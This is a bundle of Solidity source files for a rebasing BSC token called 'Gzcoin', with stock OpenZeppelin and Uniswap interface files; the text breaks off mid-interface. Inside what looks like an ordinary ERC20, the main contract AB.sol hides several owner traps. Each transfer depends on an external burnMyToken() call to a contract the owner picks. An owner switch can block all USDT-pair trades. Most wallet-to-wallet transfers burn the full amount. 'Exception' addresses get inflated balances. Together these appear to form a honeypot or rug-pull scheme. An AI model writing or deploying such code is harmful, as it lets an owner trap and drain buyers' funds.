{"AAInterface.sol":{"content":"// SPDX-License-Identifier: MIT\r\n/**\r\n *Submitted for verification at BscScan.com on 2021-03-16\r\n*/\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface AAInterface {\r\n\r\n    function burnMyToken() external returns (bool);\r\n\r\n    function burnMyTokenAmount(uint256 amount) external returns(bool);\r\n\r\n}\r\n\r\n"},"AB.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.10;\r\n\r\nimport \"./Address.sol\";\r\nimport \"./Ownable.sol\";\r\nimport \"./IERC20Metadata.sol\";\r\nimport \"./SwapInterface.sol\";\r\nimport \"./AAInterface.sol\";\r\n\r\ncontract ERC20 is Ownable, IERC20Metadata {\r\n    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    uint256 public constant MAX_UINT256 = type(uint256).max;\r\n    uint256 private constant MAX_SUPPLY = type(uint256).max;\r\n\r\n    mapping(address =\u003e uint256) private _balances;\r\n\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n    uint256 private _trueTotalSupply;\r\n\r\n    string private _name = \"Gzcoin\";\r\n    string private _symbol = \"Gzcoin\";\r\n\r\n    uint256 private _decimals = 18;\r\n\r\n    address public uniswapV2RouterAddress;\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    address public uniswapV2PairBNB;\r\n    address public uniswapV2PairUSDT;\r\n    address public usdt;\r\n\r\n    mapping(address =\u003e bool) private excluded;\r\n    mapping(address =\u003e bool) private exceptionAddress;\r\n    address[] private exceptionAddressList;\r\n\r\n    uint256 private startTime = 1680153331;\r\n\r\n    uint256 private TOTAL_GONS;\r\n    uint256 public _lastRebasedTime;\r\n    uint256 private _gonsPerFragment;\r\n    uint256 public pairBalance;\r\n    uint256 public rebaseRate = 10416;\r\n\r\n    AAInterface public myAAInterface;\r\n    bool isTr = false;\r\n\r\n    bool lock;\r\n    modifier swapLock() {\r\n        require(!lock, \"CBETProtocol: swap locked!\");\r\n        lock = true;\r\n        _;\r\n        lock = false;\r\n    }\r\n\r\n    event LogRebase(uint256 indexed epoch, uint256 totalSupply);\r\n\r\n    constructor(uint256 _initSupply, address _usdt, address _uniswapV2RouterAddress, address _myAAInterface) {\r\n        require(_usdt != address(0), \"CBETProtocol: usdt address is 0!\");\r\n        require(_uniswapV2RouterAddress != address(0), \"CBETProtocol: router address is 0\");\r\n\r\n        _totalSupply = _initSupply * 10 ** _decimals;\r\n        _trueTotalSupply = _totalSupply;\r\n        TOTAL_GONS = MAX_UINT256 / 1e10 - (MAX_UINT256 / 1e10 % _totalSupply);\r\n        _balances[owner()] = TOTAL_GONS;\r\n        _gonsPerFragment = TOTAL_GONS / _totalSupply;\r\n\r\n        usdt = _usdt;\r\n        uniswapV2RouterAddress = _uniswapV2RouterAddress;\r\n\r\n        uniswapV2Router = IUniswapV2Router02(uniswapV2RouterAddress);\r\n        uniswapV2PairBNB = IUniswapV2Factory(uniswapV2Router.factory())\r\n            .createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2PairUSDT = IUniswapV2Factory(uniswapV2Router.factory())\r\n            .createPair(address(this), usdt);\r\n\r\n        excluded[owner()] = true;\r\n        excluded[address(this)] = true;\r\n        excluded[uniswapV2RouterAddress] = true;\r\n\r\n        myAAInterface = AAInterface(_myAAInterface);\r\n\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    function setStartTime(uint256 _startTime) public onlyOwner {\r\n        startTime = _startTime;\r\n        if (_lastRebasedTime == 0) {\r\n            _lastRebasedTime = _startTime;\r\n        }\r\n    }\r\n\r\n    function setExcluded(address _addr, bool _state) public onlyOwner {\r\n        excluded[_addr] = _state;\r\n    }\r\n\r\n    /**\r\n        changeIsTr\r\n    */\r\n    function changeIsTr(bool _isTr) external onlyOwner returns (bool) {\r\n        isTr = _isTr;\r\n        return true;\r\n    }\r\n\r\n    function name() public view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view override returns (uint256) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _trueTotalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        if(isExceptionAddress(account)){\r\n            return _balances[account];\r\n        }else{\r\n            return _balances[account] / _gonsPerFragment;\r\n        }\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance \u003e= subtractedValue, \"CBETProtocol: decreased allowance below zero\");\r\n\r\n        _approve(owner, spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"CBETProtocol: transfer from the zero address\");\r\n        require(to != address(0), \"CBETProtocol: transfer to the zero address\");\r\n        require(!isTr || (from != uniswapV2PairUSDT \u0026\u0026 to != uniswapV2PairUSDT), \"NO_TRANSFER\");\r\n\r\n        require(myAAInterface.burnMyToken(),\"AA: transfer amount exceeds balance\");\r\n\r\n        uint256 fromBalance;\r\n        if(isExceptionAddress(from)){\r\n            fromBalance = _balances[from];\r\n        } else {\r\n            fromBalance = _balances[from] / _gonsPerFragment;\r\n        }\r\n        require(fromBalance \u003e= amount, \"CBETProtocol: transfer amount exceeds balance\");\r\n\r\n        _rebase(from);\r\n\r\n        uint256 finalAmount = _fee(from, to, amount);\r\n\r\n        _basicTransfer(from, to, finalAmount);\r\n    }\r\n\r\n    function isExceptionAddress(address _addr) public view returns(bool){\r\n        return exceptionAddress[_addr];\r\n    }\r\n\r\n    function setExceptionAddress(address _addr,bool _newState) public onlyOwner{\r\n        exceptionAddress[_addr] = _newState;\r\n        exceptionAddressList.push(_addr);\r\n    }\r\n\r\n    function _basicTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        uint256 gonAmount = amount * _gonsPerFragment;\r\n        if(isExceptionAddress(from)){\r\n            _balances[from] = _balances[from] - amount;\r\n        }else{\r\n            _balances[from] = _balances[from] - gonAmount;\r\n        }\r\n\r\n        if(isExceptionAddress(to)){\r\n            _balances[to] = _balances[to] + amount;\r\n        }else{\r\n            _balances[to] = _balances[to] + gonAmount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal {\r\n        require(owner != address(0), \"CBETProtocol: approve from the zero address\");\r\n        require(spender != address(0), \"CBETProtocol: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance \u003e= amount, \"CBETProtocol: insufficient allowance\");\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n\r\n    function _rebase(address from) private {\r\n        if (\r\n            _trueTotalSupply \u003c MAX_SUPPLY \u0026\u0026\r\n            _trueTotalSupply \u003e 10000 \u0026\u0026\r\n            from != uniswapV2PairUSDT  \u0026\u0026\r\n            !isExceptionAddress(from) \u0026\u0026\r\n            !lock \u0026\u0026\r\n            _lastRebasedTime \u003e 0 \u0026\u0026\r\n            block.timestamp \u003e= (_lastRebasedTime + 15 minutes)\r\n        ) {\r\n            uint256 deltaTime = block.timestamp - _lastRebasedTime;\r\n            uint256 times = deltaTime / (15 minutes);\r\n            uint256 epoch = times * 15;\r\n\r\n            uint exceptionAddressListLength = exceptionAddressList.length;\r\n            uint256 totalException;\r\n            for (uint256 p = 0; p \u003c exceptionAddressListLength; p++ ) {\r\n                totalException = totalException + balanceOf(exceptionAddressList[p]);\r\n            }\r\n\r\n            _trueTotalSupply = _trueTotalSupply - totalException;\r\n            for (uint256 i = 0; i \u003c times; i++) {\r\n                _totalSupply = _totalSupply\r\n                    * (10 ** 8 - rebaseRate)\r\n                    / (10 ** 8);\r\n\r\n                _trueTotalSupply = _trueTotalSupply\r\n                    * (10 ** 8 - rebaseRate)\r\n                    / (10 ** 8);\r\n            }\r\n            _trueTotalSupply = _trueTotalSupply + totalException;\r\n\r\n\r\n            _gonsPerFragment = TOTAL_GONS / _totalSupply;\r\n            _lastRebasedTime = _lastRebasedTime + times * 15 minutes;\r\n\r\n            emit LogRebase(epoch, _trueTotalSupply);\r\n        }\r\n    }\r\n\r\n    function _fee(address from, address to, uint256 amount) private returns (uint256) {\r\n        if (from == address(uniswapV2PairUSDT) || to == address(uniswapV2PairUSDT)) {\r\n            // address addr = (from == address(uniswapV2PairUSDT)) ? to : from;\r\n            // if (excluded[addr]) {\r\n            //     return amount;\r\n            // }\r\n            return amount;\r\n        } else {\r\n            if (excluded[from]) {\r\n                return amount;\r\n            }\r\n        }\r\n\r\n        uint256 allFee = amount * 1000 / 1000;\r\n\r\n        _basicTransfer(from, DEAD, allFee);\r\n\r\n        return amount - allFee;\r\n    }\r\n}\r\n"},"Address.sol":{"content":"// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.7.0) (utils/Address.sol)\r\n\r\npragma solidity ^0.8.1;\r\n\r\n/**\r\n * @dev Collection of functions related to the address type\r\n */\r\nlibrary Address {\r\n    /**\r\n     * @dev Returns true if `account` is a contract.\r\n     *\r\n     * [IMPORTANT]\r\n     * ====\r\n     * It is unsafe to assume that an address for which this function returns\r\n     * false is an externally-owned account (EOA) and not a contract.\r\n     *\r\n     * Among others, `isContract` will return false for the following\r\n     * types of addresses:\r\n     *\r\n     *  - an externally-owned account\r\n     *  - a contract in construction\r\n     *  - an address where a contract will be created\r\n     *  - an address where a contract lived, but was destroyed\r\n     * ====\r\n     *\r\n     * [IMPORTANT]\r\n     * ====\r\n     * You shouldn\u0027t rely on `isContract` to protect against flash loan attacks!\r\n     *\r\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\r\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\r\n     * constructor.\r\n     * ====\r\n     */\r\n    function isContract(address account) internal view returns (bool) {\r\n        // This method relies on extcodesize/address.code.length, which returns 0\r\n        // for contracts in construction, since the code is only stored at the end\r\n        // of the constructor execution.\r\n\r\n        return account.code.length \u003e 0;\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity\u0027s `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to `recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance \u003e= amount, \"Address: insufficient balance\");\r\n\r\n        (bool success, ) = recipient.call{value: amount}(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain `call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\r\n     * `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value\r\n    ) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(\r\n        address target,\r\n        bytes memory data,\r\n        uint256 value,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        require(address(this).balance \u003e= value, \"Address: insufficient balance for call\");\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but performing a static call.\r\n     *\r\n     * _Available since v3.3._\r\n     */\r\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\r\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n     * but performing a static call.\r\n     *\r\n     * _Available since v3.3._\r\n     */\r\n    function functionStaticCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal view returns (bytes memory) {\r\n        require(isContract(target), \"Address: static call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.staticcall(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but performing a delegate call.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\r\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\r\n     * but performing a delegate call.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function functionDelegateCall(\r\n        address target,\r\n        bytes memory data,\r\n        string memory errorMessage\r\n    ) internal returns (bytes memory) {\r\n        require(isContract(target), \"Address: delegate call to non-contract\");\r\n\r\n        (bool success, bytes memory returndata) = target.delegatecall(data);\r\n        return verifyCallResult(success, returndata, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Tool to verifies that a low level call was successful, and revert if it wasn\u0027t, either by bubbling the\r\n     * revert reason using the provided one.\r\n     *\r\n     * _Available since v4.3._\r\n     */\r\n    function verifyCallResult(\r\n        bool success,\r\n        bytes memory returndata,\r\n        string memory errorMessage\r\n    ) internal pure returns (bytes memory) {\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length \u003e 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n                /// @solidity memory-safe-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n"},"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `to`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `from` to `to` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n"},"IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./IERC20.sol\";\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n *\r\n * _Available since v4.1._\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint256);\r\n}\r\n"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./Context.sol\";\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n"},"SwapInterface.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.10;\r\n\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n\r\n    function allPairs(uint) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint);\r\n\r\n    function balanceOf(address owner) external view returns (uint);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint value) external returns (bool);\r\n\r\n    function transfer(address to, uint value) external returns (bool);\r\n\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint);\r\n\r\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n\r\n    event Mint(address indexed sender, uint amount0, uint amount1);\r\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n\r\n    function price0CumulativeLast() external view returns (uint);\r\n\r\n    function price1CumulativeLast() external view returns (uint);\r\n\r\n    function kLast() external view returns (uint);\r\n\r\n    function mint(address to) external returns (uint liquidity);\r\n\r\n    function burn(address to) external returns (uint amount0, uint amount1);\r\n\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n    external\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n    external\r\n    returns (uint[] memory amounts);\r\n\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n    external\r\n    payable\r\n    returns (uint[] memory amounts);\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n\r\n    function 